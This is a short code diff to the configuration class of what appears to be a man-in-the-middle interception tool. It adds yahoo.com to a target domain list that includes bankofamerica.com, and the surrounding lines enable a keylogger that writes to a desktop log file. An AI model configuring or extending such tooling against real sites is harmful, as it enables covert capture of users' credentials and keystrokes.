@@ -18,7 +18,8 @@ public class EasyMIMConfig {
 				"youtube.com",
 				"bankofamerica.com",
 				"att.com",
-				"wikipedia.org"
+				"wikipedia.org",
+				"yahoo.com"
 		}));
 		this.keylogger = true;
 		this.logSavePath = "C:/Users/David/Desktop/log.txt";
